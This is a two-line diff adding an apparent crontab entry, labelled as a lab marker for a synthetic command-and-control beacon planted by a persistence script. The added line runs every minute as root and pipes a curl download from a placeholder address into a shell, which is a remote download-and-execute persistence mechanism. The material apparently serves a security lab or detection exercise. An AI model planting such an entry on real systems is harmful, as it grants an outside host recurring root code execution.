@@ -1,0 +1,2 @@
+# LAB MARKER — synthetic C2 beacon planted by 07_persistence.sh
+* * * * * root curl -s http://203.0.113.9/beacon | sh
